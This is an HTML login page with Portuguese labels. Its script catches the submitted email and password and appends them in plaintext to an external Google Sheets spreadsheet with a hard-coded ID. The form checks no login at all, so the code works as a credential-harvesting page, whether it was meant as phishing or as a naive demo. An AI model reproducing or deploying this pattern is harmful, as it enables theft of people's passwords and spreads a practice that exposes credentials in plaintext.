<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Login</title>
    <script src="https://apis.google.com/js/api.js"></script>
</head>
<body>

<h2>Login</h2>

<form id="loginForm">
    <div>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" autocomplete="email" required>
    </div>
    <div>
        <label for="password">Senha:</label>
        <input type="password" id="password" name="password" autocomplete="current-password" required>
    </div>
    <button type="submit">Entrar</button>
</form>

<script>
    // Função para enviar dados para a planilha
    function sendDataToSheet(email, password) {
        // Dados a serem enviados para a planilha
        var newData = [
            [email, password]
        ];

        // Inicializa a API do Google Sheets
        gapi.client.init({
            clientId: 'SEU_CLIENT_ID_AQUI',
            apiKey: 'SUA_API_KEY_AQUI',
            discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"],
        }).then(function() {
            // Envia os dados para a planilha
            return gapi.client.sheets.spreadsheets.values.append({
                spreadsheetId: '10SzlIm9UmtghsOmq5PM0yw7yHzy_I-1P_UBH95ugtKM',
                range: 'Planilha1!A:B',
                valueInputOption: 'RAW', // Método de entrada dos dados
                resource: { values: newData }
            });
        }).then(function(response) {
            console.log('Dados enviados com sucesso para a planilha:', response);
            // Exibe uma mensagem de sucesso na página
            var successMessage = document.createElement('p');
            successMessage.textContent = 'Dados enviados com sucesso para a planilha!';
            document.body.appendChild(successMessage);
        }).catch(function(error) {
            console.error('Erro ao enviar dados para a planilha:', error);
            // Exibe uma mensagem de erro na página
            var errorMessage = document.createElement('p');
            errorMessage.textContent = 'Erro ao enviar dados para a planilha. Verifique o console para mais detalhes.';
            document.body.appendChild(errorMessage);
        });
    }

    // Event listener para o envio do formulário
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Evita o envio padrão do formulário
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        sendDataToSheet(email, password); // Chama a função para enviar dados para a planilha
    });

    // Carrega a API do Google Sheets e a biblioteca auth2 quando a página é totalmente carregada
    gapi.load('client:auth2', function() {
        gapi.auth2.init(); // Inicializa a biblioteca auth2
    });

</script>

</body>
</html>
